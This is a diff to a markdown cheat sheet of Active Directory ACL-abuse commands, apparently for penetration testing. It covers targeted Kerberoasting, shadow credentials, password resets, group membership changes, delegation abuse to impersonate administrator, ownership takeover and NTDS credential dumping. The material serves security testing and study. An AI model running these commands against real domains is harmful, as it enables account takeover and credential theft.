@@ -8,7 +8,8 @@
 - [ReadGMSAPassword](#readgmsapassword)
 - [DCSync](#dcsync)
 ## GenericWrite
-### targetKerberoasting
+> Update object's attributes
+### Targeted Kerberoasting
 ```bash
 python targetedKerberoast.py -v -d <domain> -u <username> -p <password>
 ```
@@ -25,9 +26,14 @@ Using Kerberos
 certipy shadow auto -username username@domain -p <password> -k -account <target_username> -target <dc>
 ```
 ## GenericALL
+> Full rights to the object (add users to a group or reset user's password)
 ### Password Change
 ```bash
 net rpc password <username> <new_password> -U <domain>/<username>%<hash> -S <dc> --pw-nt-hash
+```
+### Add user to a group
+```bash
+net rpc group addmem <target_group> <username> -U <domain>/<username> -S <dc>
 ```
 ### RBCD
 ```bash
@@ -42,6 +48,7 @@ getST.py -spn 'cifs/<dc>' -impersonate administrator -dc-ip <ip> '<domain>/<mach
 export KRB5CCNAME=administrator.ccache
 ```
 ## ForceChangePassword
+> Ability to change user's password
 ```bash
 net rpc password <TargetUser> <new_password> -U "DOMAIN"/"ControlledUser"%"Password" -S <DomainController>
 ```
@@ -58,6 +65,7 @@ python rpcchangepwd.py <domain>/<username>:<password>@<ip> -newpass <new_passwor
 net rpc group addmem <target_group> <username> -U <domain>/<username> -S <dc>
 ```
 ## WriteOwner
+> Change object owner to attacker controlled user take over the object
 ```bash
 owneredit.py -action write -new-owner <username> -target <group_name> <domain>/<username>:<password>
 ```
@@ -100,3 +108,5 @@ nxc smb <domain> -k --use-kcache --ntds
 # Resources
 - https://www.thehacker.recipes/ad/movement/dacl/
 - https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/acl-abuse
+- https://mayfly277.github.io/posts/GOADv2-pwning-part11/
+- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces
